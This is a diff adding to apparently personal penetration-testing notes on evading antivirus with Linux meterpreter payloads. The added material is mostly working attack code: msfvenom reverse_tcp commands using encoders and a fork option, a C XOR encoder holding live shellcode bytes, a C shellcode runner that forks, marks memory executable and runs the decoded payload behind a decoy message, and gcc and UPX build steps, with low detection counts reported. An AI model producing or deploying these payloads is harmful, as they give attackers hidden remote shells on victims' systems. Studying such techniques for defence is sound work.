@@ -54,7 +54,16 @@ But this payload is undetected:
 $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru -f elf -o met.elf
 ```
 
-**C# shellcode wrapper**
+As an alternative, we could use fork payload + timeout + best encoder:
+```bash
+msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -o challenge3.elf
+
+# Parameters:
+# prependfork: fork before executing the payload
+# -t: timeout -> number of seconds to wait when reading the payload from STDIN
+```
+
+**C shellcode wrapper**
 
 1. Generate unencoded payload:
 ```bash
@@ -92,7 +101,7 @@ msf> set payload linux/x64/meterpreter/reverse_tcp
 msf> run
 ```
 
-4. Compile the payload:
+4. Compile the payload (use the [[Compiling Payloads]] technique):
 ```bash
 gcc -o hack.out hack.c -z execstack
 
@@ -186,7 +195,7 @@ int main (int argc, char **argv)
 }
 ```
 
-5. Compile the payload:
+5. Compile the payload (use the [[Compiling Payloads]] technique):
 ```bash
 gcc -o hack.out hack.c -z execstack
 ```
@@ -197,6 +206,116 @@ gcc -o hack.out hack.c -z execstack
 ```
 
 Detection: 0/26
+
+**C Encoded XOR ShellCode Wrapper + Child Process Migration**
+
+1. Generate the shellcode:
+```bash
+$ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
+```
+
+2. Write the encoder:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// $ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p linux/x64/meterpreter/reverse_tcp -f c -o met.c
+unsigned char buf[] = 
+"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
+"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
+"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
+"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
+"\x01\xbb\xc0\xa8\x2d\xa1\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
+"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
+"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
+"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
+"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
+"\x78\xed\xff\xe6";
+
+int main (int argc, char **argv) 
+{
+	char xor_key = 'J';
+	int payload_length = (int) sizeof(buf);
+
+	for (int i=0; i<payload_length; i++)
+	{
+		printf("\\x%02X",buf[i]^xor_key);
+	}
+
+	return 0;
+
+}
+```
+
+2. Compile and execute it:
+```bash
+gcc -o encoder.out encoder.c
+```
+
+3. Now lets craft the shellcode runner:
+```c
+#define _GNU_SOURCE
+#include <sys/mman.h> // for mprotect
+#include <stdlib.h>
+#include <stdio.h>
+#include <dlfcn.h> // defines functions for interacting with the Dynamic Link Loader
+#include <unistd.h>
+
+// encrypted shellcode
+unsigned char buf[] = "\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\x20\x4D\x10\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x67\xEB\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A";
+
+// define hooking function (like the original one)
+int main () 
+{
+	printf("I love programming.");
+	
+	// create a new process for the shellcode and dont stop the main process:
+	if (fork() == 0) {
+		// new process (fork branch)
+		
+		// check that the shellcode resides on an executable memory page before executing it:
+        intptr_t pagesize = sysconf(_SC_PAGESIZE); // get the size of a memory page
+        // change the page of memory that contains our shellcode and make it executable
+        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
+            perror("mprotect");
+            return 3;
+        }
+        
+        char xor_key = 'J';
+		int arraysize = (int) sizeof(buf);
+		for (int i=0; i<arraysize-1; i++)
+		{
+			buf[i] = buf[i]^xor_key;
+		}
+        
+        int (*ret)() = (int(*)())buf;
+        ret();
+    }
+    else {
+        printf("HACK: returning from function...\n");
+    }
+    printf("HACK: Returning from main...\n");
+    return 3;
+}
+```
+
+4. Compile the payload (use the [[Compiling Payloads]] technique):
+```bash
+# Static (working)
+gcc -Wall -static -o challenge.elf hack2.c -z execstack -std=c11
+
+# dynamic
+gcc -Wall -fPIC -c -o challenge.elf hack2.c -z execstack
+
+# alternative
+gcc -O3 -s -static --function-sections -fdata-sections -Wl,--gc-sections -o challenge.elf hack2.c
+```
+
+5. If we use static compilation, the payload will be too big. To reduce the size without affecting the payload, we can use a packer:
+```bash
+upx --best challenge.elf
+```
 
 ---
 # Takeaways
